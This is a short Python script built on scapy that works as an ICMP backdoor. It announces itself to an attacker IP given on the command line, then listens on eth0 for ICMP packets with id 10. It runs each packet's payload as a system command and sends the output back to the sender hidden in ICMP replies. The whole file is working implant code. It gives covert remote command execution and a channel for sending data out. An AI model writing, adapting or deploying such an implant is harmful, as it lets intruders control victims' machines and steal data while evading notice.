from scapy.all import *
import subprocess
import sys

attacker_ip = sys.argv[1]



def send_icmp_to_attacker():
    packet = IP(dst=attacker_ip) / ICMP(id=10)
    send(packet)
    print(f"sent to {attacker_ip}")


# ICMP id 10 = 0xa
def check_packet(packet):
    if packet.haslayer(ICMP):
        if packet[ICMP].id == 10:
            # packet.show()
            # print(packet[Raw].load)
            if packet[Raw].load:
                print("incoming packet")
                packet.show()
                result = subprocess.run(
                    packet[Raw].load, capture_output=True, text=True
                )
                # print(result.stdout)
                print("outgoing packet")
                reply_packet = (
                    IP(dst=packet[IP].src) / ICMP(id=10) / Raw(load=result.stdout)
                )
                reply_packet.show()
                send(reply_packet)


def main():
    send_icmp_to_attacker()
    sniff(prn=check_packet, filter='inbound', iface="eth0")


if __name__ == "__main__":
    main()